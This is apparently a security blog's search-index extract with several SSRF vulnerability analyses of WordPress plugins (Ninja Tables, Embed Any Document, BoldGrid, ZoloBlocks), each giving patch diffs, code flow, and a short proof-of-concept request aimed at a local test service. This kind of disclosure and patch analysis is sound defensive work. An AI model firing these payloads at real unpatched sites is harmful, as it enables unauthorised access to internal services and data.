E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"]\rE --\u003e F[\"Response → callback → HTTP Response\"]\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"]\rE --\u003e F[\"Response → callback → HTTP Response\"]\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"]\rE --\u003e F[\"Response → callback → HTTP Response\"]\r","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rCreate a simple local service with Python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/delete') def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rSend a POST request with the URL pointing to the local service: POST /wp-admin/admin-post.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 Accept: */* Content-Type: application/x-www-form-urlencoded Content-Length: 146 Connection: close action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[url]=http://localhost:8001/delete?id=1\u0026args[method]=GET\u0026args[name]=Tokuda Result: GET request to local service\r","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe SSRF vulnerability in Ninja Tables ≤ 5.0.18 shows that the args[url] parameter provided by the client is used directly to perform server-side requests without validation, allowing an unauthenticated attacker to force the application to access arbitrary destinations. The patch in ≥ 5.0.19 removed the unsafe code and mitigated this attack vector. ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rUpgrade immediately to 5.0.19 or later. Do not use client input directly as a request URL — validate/normalize before use. Implement allowlists for hosts/ports and block private IP ranges (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16, etc.). Avoid registering admin_post_nopriv_* endpoints for functions that perform outbound requests, or add proper permission/CSRF controls. ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Ninja Tables Plugin \u003c= 5.0.18 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Embed Any Document Plugin.","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe “Embed Any Document – Embed PDF, Word, PowerPoint and Excel Files” plugin for WordPress contains a Server-Side Request Forgery (SSRF) vulnerability in all versions up to and including 2.7.5 via the 'embeddoc' shortcode. This vulnerability allows authenticated attackers with Contributor access or higher to make web requests to arbitrary destinations originating from the web application and can be used to query or modify information from internal services. CVE ID: CVE-2025-1043 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.7.5 Patched Versions: 2.7.6 CVSS severity: Low (4.9) Required Privilege: Contributor Product: WordPress Embed Any Document Plugin ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Embed Any Document: 2.7.5 (vulnerable) and 2.7.6 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between versions. ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rpublic function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } In the vulnerable version, embed_shortcode() performs an HTTP HEAD request using wp_remote_head() with the url value taken directly from $shortcode_atts['url']. Because there is no validation, filtering, or scope limitation for the URL, an attacker can supply an arbitrary URL — leading to requests being sent to local services and causing SSRF. public function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_safe_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } The patch replaces wp_remote_head() with wp_safe_remote_head(), which adds safety checks to prevent access to internal/private/loopback/link-local addresses, thereby mitigating SSRF risk. ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rTo reach the wp_remote_head( $shortcode_atts['url'] ) call in embed_shortcode(), an attacker must bypass the following checks: url must be set and not empty if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) $show must be set to true before entering the HEAD call $show defaults to false. It becomes true only when if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) returns true and one of the following is satisfied: if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } download equals 'alluser' or 'all'. download equals 'logged' and is_user_logged_in() returns true (i.e., the user is logged in). public function allowdownload( $provider ) { $blacklist = array( 'drive', 'box' ); if ( in_array( $provider, $blacklist, true ) ) { return false; } else { return true; } } allowdownload() returns true if the $provider ($shortcode_atts['viewer']) is not present in the $blacklist. Bug\rBecause the SSRF is performed via HTTP HEAD, the response body is not returned, but metadata (Content-Type, Content-Length) can still be disclosed and internal endpoints can be probed. If an endpoint does not distinguish by HTTP method, state-changing actions may be triggered.\rembed_shortcode() is registered as the shortcode callback: add_shortcode( 'embeddoc', array( $this, 'embed_shortcode' ) ); ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\r","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rCreate a simple local service in Python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/delete') def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rLog in with a Contributor account Create a post with the shortcode [embeddoc url=http://localhost:8001/delete?id=1 download=all] Result: HEAD request to local service\r","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-1043 is an SSRF due to the plugin calling wp_remote_head() with a URL from the shortcode without validation. Although the request is a HEAD (no body), it can still disclose metadata and probe internal services or, via redirects or method-agnostic endpoints, cause state changes. The patch (v2.7.6) uses esc_url_raw() + wp_safe_remote_head() to mitigate the risk. ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rCause: missing filtering/whitelist of URLs before making server-side HTTP calls. Impact: metadata leak, internal discovery, possible chaining (redirect → GET, method-agnostic endpoints). Fix: update to v2.7.6. Short recommendations: use wp_safe_remote_*, esc_url_raw()/whitelist, disable redirects when only headers are needed, and limit user privileges. ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Embed Any Document Plugin \u003c= 2.7.5 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin.","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rA Server-Side Request Forgery (SSRF) vulnerability in the BoldGrid Post and Page Builder by BoldGrid – Visual Drag and Drop Editor plugin allows an attacker to perform forged requests from the server. This issue affects the Post and Page Builder by BoldGrid – Visual Drag and Drop Editor plugin from an unknown version up to 1.27.8. CVE ID: CVE-2025-52713 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.27.8 Patched Versions: 1.27.9 CVSS severity: Low (6.4) Required Privilege: Contributor Product: WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Post and Page Builder by BoldGrid – Visual Drag and Drop Editor: 1.27.8 (vulnerable) and 1.27.9 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rpublic function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' ); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_remote_head( $url ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } In the vulnerable version, get_redirect_url() reads an array of URLs from $_POST['urls'], then iterates each element and issues a request via wp_remote_head($url) without validating or sanitizing the input. This allows an attacker to supply arbitrary URLs so the server will request internal addresses like 127.0.0.1 or 169.254.169.254, leading to SSRF. Also, because there are no timeout or redirection limits, the function can be abused to cause hangs or denial-of-service (DoS). public function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' ); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_safe_remote_head( esc_url_raw( $url ), array( 'timeout' =\u003e 5, 'redirection' =\u003e 5, ) ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } The patch replaces wp_remote_head() with wp_safe_remote_head() together with esc_url_raw() to sanitize and allow only valid URLs, and adds protective parameters timeout =\u003e 5 and redirection =\u003e 5. This prevents requests to internal/loopback addresses and reduces performance-related risks. ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rThe call self::validate_nonce( 'image' ); is used to verify a nonce — WordPress’s mechanism to prevent CSRF (Cross-Site Request Forgery). public static function validate_nonce( $name ) { $nonce = ! empty( $_POST[ self::$nonces[ $name ] ] ) ? $_POST[ self::$nonces[ $name ] ] : null; $valid = wp_verify_nonce( $nonce, self::$nonces[ $name ] ); if ( ! $valid ) { status_header( 401 ); wp_send_json_error(); } } The plugin defines a static $nonces array that maps actions to nonce keys: protected static $nonces = array( 'image' =\u003e 'boldgrid_gridblock_image_ajax_nonce', 'setup' =\u003e 'boldgrid_editor_setup', 'gridblock_save' =\u003e 'boldgrid_editor_gridblock_save', ); When validate_nonce('image') is called, it: Reads the nonce value from POST using the key boldgrid_gridblock_image_ajax_nonce. Verifies it via wp_verify_nonce(). If invalid, returns HTTP 401 Unauthorized and halts processing with wp_send_json_error(). Tip\rWhen searching for boldgrid_gridblock_image_ajax_nonce in the plugin source, we find it is assigned from the JavaScript variable BoldgridEditor.grid_block_nonce. Nonce value in JS\rBecause this AJAX request is sent from the client, you can obtain the current nonce by opening the browser Console and calling: BoldgridEditor.grid_block_nonce when creating a post with this plugin. Nonce value in console\rget_redirect_url() is registered as a callback for the action hook: add_action( 'wp_ajax_boldgrid_redirect_url', array( $boldgrid_editor_ajax, 'get_redirect_url' ) ); This means when a client sends an AJAX request to /wp-admin/admin-ajax.php?action=boldgrid_redirect_url, get_redirect_url() will be invoked. ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"]\rB --\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ← SSRF sink\"]\rF --\u003e G[\"extract headers['location'] → $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"]\rB --\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ← SSRF sink\"]\rF --\u003e G[\"extract headers['location'] → $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"]\rB --\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ← SSRF sink\"]\rF --\u003e G[\"extract headers['location'] → $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"]\rB --\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ← SSRF sink\"]\rF --\u003e G[\"extract headers['location'] → $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\r","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rCreate a simple local service with Python: from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rSend a POST request with the URL pointing to the local service: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C07a62e731a6142aa7b15555fdd5e1cbdd114cffb4a041ba0ecd9394c8319bb3f; wp-settings-time-2=1761643645; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C450b8e4bb8ebb335d435b94645ae098cee383a09a6e129efbdec8a2348deeda0 ... action=boldgrid_redirect_url\u0026urls[0]=http://localhost:8001/metadata\u0026boldgrid_gridblock_image_ajax_nonce=482dbb1ed2 Result: Content read from local service\r","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability CVE-2025-52713 stems from get_redirect_url() in the BoldGrid Post and Page Builder plugin (≤ 1.27.8) issuing HTTP requests to user-supplied URLs without validation or restrictions, resulting in SSRF. An attacker with Contributor privileges and a valid nonce can force the server to request internal addresses. The patch (1.27.9) fixes this by using esc_url_raw() and wp_safe_remote_head() with timeout and redirection limits to prevent unsafe requests. ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rCause: missing validation and sanitization of user-provided URLs. Nonce only protects against CSRF, not SSRF. Impact: Low (6.4) but may lead to internal data disclosure. Update to v1.27.9 to remediate. Development best practice: always use safe APIs (wp_safe_remote_*) and sanitize URLs with esc_url_raw(). ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin \u003c= 1.27.8 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress ZoloBlocks Plugin.","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rA Server-Side Request Forgery (SSRF) vulnerability in BdThemes ZoloBlocks allows an attacker to make forged requests from the server. This issue affects ZoloBlocks versions from an unspecified initial version up to 2.3.11. CVE ID: CVE-2025-60161 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.3.11 Patched Versions: 2.3.12 CVSS severity: Low (5.4) Required Privilege: Unauthenticated Product: WordPress ZoloBlocks Plugin 